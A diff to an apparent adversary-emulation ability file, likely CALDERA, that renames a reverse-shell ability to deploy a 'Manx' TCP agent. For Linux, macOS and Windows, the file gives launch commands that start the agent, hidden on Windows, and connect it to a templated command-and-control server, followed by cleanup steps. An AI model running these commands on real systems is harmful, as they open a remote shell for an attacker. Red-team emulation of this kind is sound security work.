@@ -1,8 +1,8 @@
 ---
 
 - id: 356d1722-7784-40c4-822b-0cf864b0b36d
-  name: Reverse shell
-  description: Start a TCP reverse-shell
+  name: Deploy Manx
+  description: Start a TCP agent including a reverse-shell
   tactic: execution
   technique:
     attack_id: T1059
@@ -11,19 +11,19 @@
     darwin:
       sh:
         command: |
-          nohup ./reverse.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
-        payload: reverse.go
+          nohup ./manx.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
+        payload: manx.go
     linux:
       sh:
         command: |
-          nohup ./reverse.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
-        payload: reverse.go
+          nohup ./manx.go -tcp #{tcp_socket} -http #{server} && sleep 3 >/dev/null 2>&1 &
+        payload: manx.go
     windows:
       psh:
         command: |
-          mv reverse.go reverse.go.exe;
-          Start-Process -FilePath .\reverse.go.exe -ArgumentList "-tcp #{tcp_socket} -http #{server}" -WindowStyle hidden;
+          mv manx.go manx.go.exe;
+          Start-Process -FilePath .\manx.go.exe -ArgumentList "-tcp #{tcp_socket} -http #{server}" -WindowStyle hidden;
         cleanup: |
-          rm reverse.go;
-          rm reverse.go.exe;
-        payload: reverse.go
+          rm manx.go;
+          rm manx.go.exe;
+        payload: manx.go
